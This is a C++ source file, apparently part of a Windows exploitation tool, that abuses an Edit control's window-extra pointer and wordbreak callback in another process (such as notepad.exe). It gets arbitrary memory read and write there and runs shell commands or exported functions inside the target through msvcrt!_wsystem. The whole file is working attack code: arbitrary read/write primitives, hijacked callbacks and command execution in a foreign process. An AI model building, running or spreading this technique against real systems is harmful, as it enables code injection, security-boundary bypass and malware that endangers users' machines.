#include "Memory.h"
#include <TlHelp32.h>
#include <psapi.h>
#include <stdio.h>

#pragma comment(lib, "psapi.lib")

namespace ebp {

Memory::Memory()
    : m_hEdit(nullptr)
    , m_origExtra(0)
    , m_origWbp(0)
    , m_pid(0)
    , m_attached(false)
{}

Memory::~Memory() {
    Detach();
}

/*
 * Init - Attach to a target process by name.
 * @param processName  Executable name (e.g. "notepad.exe").
 * @return             True if a writable Edit control was found and attached.
 *
 * Locates the process via snapshot, enumerates its windows for an Edit control
 * with writable cbWndExtra, and saves the original extra[0] and wordbreak proc
 * for later restoration.
 */
bool Memory::Init(const char* processName) {
    if (m_attached)
        Detach();

    m_pid = FindProcessByName(processName);
    if (!m_pid) {
        printf("Process '%s' not found.\n", processName);
        return false;
    }
    printf("Found PID %lu\n", m_pid);

    m_hEdit = FindEditInProcess(m_pid);
    if (!m_hEdit) {
        printf("No writable Edit control in PID %lu.\n", m_pid);
        m_pid = 0;
        return false;
    }

    m_origExtra = GetWindowLongPtrA(m_hEdit, 0);
    m_origWbp   = SendMessageA(m_hEdit, EM_GETWORDBREAKPROC, 0, 0);
    m_attached  = true;

    printf("Attached.\n");
    printf("  HWND     = 0x%llX\n", (uint64_t)m_hEdit);
    printf("  extra[0] = 0x%llX (tagED*)\n", (uint64_t)m_origExtra);
    printf("  PID      = %lu\n", m_pid);
    return true;
}

/*
 * Detach - Restore original state and release the target.
 *
 * Writes back the saved extra[0] and wordbreak proc, ensuring the target
 * Edit control is left in a clean state.
 */
void Memory::Detach() {
    if (!m_attached) return;

    SetWindowLongPtrA(m_hEdit, 0, m_origExtra);
    SendMessageA(m_hEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)m_origWbp);

    printf("Detached from PID %lu.\n", m_pid);
    m_hEdit     = nullptr;
    m_origExtra = 0;
    m_origWbp   = 0;
    m_pid       = 0;
    m_attached  = false;
}

bool Memory::IsAttached() const { return m_attached; }
DWORD Memory::GetPid() const { return m_pid; }
HWND Memory::GetEditHwnd() const { return m_hEdit; }

/*
 * PrimRead8 - Read 8 bytes at an arbitrary address in the target process.
 * @param target  Address to read from.
 * @param out     Receives the 8-byte value.
 * @return        True on success.
 *
 * Temporarily sets extra[0] = (target - 0x90) so EditWndProc interprets it
 * as a tagED*. EM_GETWORDBREAKPROC then returns *(tagED + 0x90) = *target.
 * extra[0] is restored immediately after.
 */
bool Memory::PrimRead8(uintptr_t target, uint64_t* out) {
    SetWindowLongPtrA(m_hEdit, 0, (LONG_PTR)(target - 0x90));
    *out = (uint64_t)SendMessageA(m_hEdit, EM_GETWORDBREAKPROC, 0, 0);
    SetWindowLongPtrA(m_hEdit, 0, m_origExtra);
    return true;
}

/*
 * PrimWrite8 - Write 8 bytes at an arbitrary address in the target process.
 * @param target  Address to write to.
 * @param val     8-byte value to write.
 * @return        True on success.
 *
 * Same redirection as PrimRead8. EM_SETWORDBREAKPROC writes lParam to
 * *(tagED + 0x90) = *target.
 */
bool Memory::PrimWrite8(uintptr_t target, uint64_t val) {
    SetWindowLongPtrA(m_hEdit, 0, (LONG_PTR)(target - 0x90));
    SendMessageA(m_hEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)val);
    SetWindowLongPtrA(m_hEdit, 0, m_origExtra);
    return true;
}

/*
 * ReadBytes - Read a raw byte buffer from the target process.
 * @param address  Start address in the target.
 * @param buffer   Destination buffer.
 * @param length   Number of bytes to read.
 * @return         True on success.
 *
 * Strides in 8-byte chunks via PrimRead8. Handles partial tail reads
 * for lengths not aligned to 8.
 */
bool Memory::ReadBytes(uintptr_t address, void* buffer, size_t length) {
    if (!m_attached) return false;

    auto dst = (uint8_t*)buffer;
    size_t offset = 0;

    while (offset + 8 <= length) {
        uint64_t val;
        if (!PrimRead8(address + offset, &val)) return false;
        memcpy(dst + offset, &val, 8);
        offset += 8;
    }

    if (offset < length) {
        uint64_t val;
        if (!PrimRead8(address + offset, &val)) return false;
        memcpy(dst + offset, &val, length - offset);
    }

    return true;
}

/*
 * WriteBytes - Write a raw byte buffer to the target process.
 * @param address  Start address in the target.
 * @param buffer   Source buffer.
 * @param length   Number of bytes to write.
 * @return         True on success.
 *
 * Strides in 8-byte chunks via PrimWrite8. Partial tail bytes use
 * read-modify-write to avoid clobbering adjacent memory.
 */
bool Memory::WriteBytes(uintptr_t address, const void* buffer, size_t length) {
    if (!m_attached) return false;

    auto src = (const uint8_t*)buffer;
    size_t offset = 0;

    while (offset + 8 <= length) {
        uint64_t val;
        memcpy(&val, src + offset, 8);
        if (!PrimWrite8(address + offset, val)) return false;
        offset += 8;
    }

    if (offset < length) {
        uint64_t existing;
        if (!PrimRead8(address + offset, &existing)) return false;
        memcpy(&existing, src + offset, length - offset);
        if (!PrimWrite8(address + offset, existing)) return false;
    }

    return true;
}

/*
 * Execute - Run a shell command inside the target process.
 * @param command  Command string (e.g. "calc").
 * @return         True if the target survived execution.
 *
 * Sets the Edit text to the command (ANSI->Unicode via SendMessageA),
 * points the wordbreak callback at msvcrt!_wsystem, then triggers
 * WM_LBUTTONDBLCLK which invokes _wsystem(L"command") in the target.
 * Restores original text and callback after execution.
 */
bool Memory::Execute(const char* command) {
    if (!m_attached) return false;

    uintptr_t pWsystem = ResolveExport("msvcrt.dll", "_wsystem");
    if (!pWsystem) {
        printf("Failed to resolve msvcrt.dll!_wsystem\n");
        return false;
    }

    WCHAR savedText[4096] = {};
    SendMessageW(m_hEdit, WM_GETTEXT, _countof(savedText), (LPARAM)savedText);

    SendMessageA(m_hEdit, WM_SETTEXT, 0, (LPARAM)command);
    SendMessageA(m_hEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)pWsystem);
    SendMessageA(m_hEdit, WM_LBUTTONDBLCLK, MK_LBUTTON, MAKELPARAM(5, 5));

    SendMessageA(m_hEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)m_origWbp);
    SendMessageW(m_hEdit, WM_SETTEXT, 0, (LPARAM)savedText);

    return IsWindow(m_hEdit) != 0;
}

/*
 * Call - Invoke an exported function in the target process.
 * @param dll   Module name (e.g. "kernel32.dll").
 * @param func  Export name (e.g. "ExitProcess").
 * @return      True if the call was dispatched successfully.
 *
 * Resolves the export address, points the wordbreak callback at it,
 * and triggers WM_LBUTTONDBLCLK. The function receives a pointer to
 * the current Edit text (wide) as its first argument.
 * Restores the original callback after invocation.
 */
bool Memory::Call(const char* dll, const char* func) {
    if (!m_attached) return false;

    uintptr_t pFunc = ResolveExport(dll, func);
    if (!pFunc) {
        printf("Failed to resolve %s!%s\n", dll, func);
        return false;
    }

    WCHAR savedText[4096] = {};
    SendMessageW(m_hEdit, WM_GETTEXT, _countof(savedText), (LPARAM)savedText);

    SendMessageA(m_hEdit, WM_SETTEXT, 0, (LPARAM)".");
    SendMessageA(m_hEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)pFunc);
    SendMessageA(m_hEdit, WM_LBUTTONDBLCLK, MK_LBUTTON, MAKELPARAM(5, 5));

    SendMessageA(m_hEdit, EM_SETWORDBREAKPROC, 0, (LPARAM)m_origWbp);
    SendMessageW(m_hEdit, WM_SETTEXT, 0, (LPARAM)savedText);

    return IsWindow(m_hEdit) != 0;
}

/*
 * FindProcessByName - Locate a process by executable name.
 * @param name  Executable filename (case-insensitive).
 * @return      PID if found, 0 otherwise.
 */
DWORD Memory::FindProcessByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;

    WCHAR wideName[MAX_PATH] = {};
    MultiByteToWideChar(CP_ACP, 0, name, -1, wideName, MAX_PATH);

    if (Process32First(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, wideName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

struct EditSearchCtx {
    DWORD pid;
    HWND  result;
};

/*
 * EnumChildProc - Callback for EnumChildWindows.
 *
 * Checks each window: must belong to the target PID, have class "Edit",
 * have cbWndExtra >= sizeof(LONG_PTR), and be both readable and writable
 * via GetWindowLongPtr / SetWindowLongPtr at offset 0.
 */
static BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    auto ctx = (EditSearchCtx*)lParam;
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    if (pid != ctx->pid) return TRUE;

    char cls[64];
    GetClassNameA(hwnd, cls, sizeof(cls));
    if (_stricmp(cls, "Edit") != 0) return TRUE;

    int cbExtra = GetClassLongPtrA(hwnd, GCL_CBWNDEXTRA);
    if (cbExtra < (int)sizeof(LONG_PTR)) return TRUE;

    SetLastError(0);
    LONG_PTR val = GetWindowLongPtrA(hwnd, 0);
    if (GetLastError() != 0 || val == 0) return TRUE;

    SetLastError(0);
    SetWindowLongPtrA(hwnd, 0, val);
    if (GetLastError() != 0) return TRUE;

    ctx->result = hwnd;
    return FALSE;
}

static BOOL CALLBACK EnumTopProc(HWND hwnd, LPARAM lParam) {
    EnumChildProc(hwnd, lParam);
    if (((EditSearchCtx*)lParam)->result) return FALSE;
    EnumChildWindows(hwnd, EnumChildProc, lParam);
    return ((EditSearchCtx*)lParam)->result == nullptr;
}

/*
 * FindEditInProcess - Find a writable Edit control in the given process.
 * @param pid  Target process ID.
 * @return     HWND of the first writable Edit, or nullptr.
 */
HWND Memory::FindEditInProcess(DWORD pid) {
    EditSearchCtx ctx = { pid, nullptr };
    EnumWindows(EnumTopProc, (LPARAM)&ctx);
    return ctx.result;
}

/*
 * ResolveExport - Get the address of an exported function.
 * @param dll   Module name (e.g. "kernel32.dll").
 * @param func  Export name (e.g. "WinExec").
 * @return      Address, or 0 on failure.
 *
 * Valid cross-process because system DLLs share per-boot ASLR bases.
 */
uintptr_t Memory::ResolveExport(const char* dll, const char* func) {
    HMODULE hMod = GetModuleHandleA(dll);
    if (!hMod) hMod = LoadLibraryA(dll);
    if (!hMod) return 0;
    return (uintptr_t)GetProcAddress(hMod, func);
}

/*
 * GetModuleBase - Get the base address of a loaded module.
 * @param moduleName  Module name (e.g. "user32.dll").
 * @return            Base address, or 0 on failure.
 */
uintptr_t Memory::GetModuleBase(const char* moduleName) {
    HMODULE hMod = GetModuleHandleA(moduleName);
    if (!hMod) hMod = LoadLibraryA(moduleName);
    return (uintptr_t)hMod;
}

} // namespace ebp
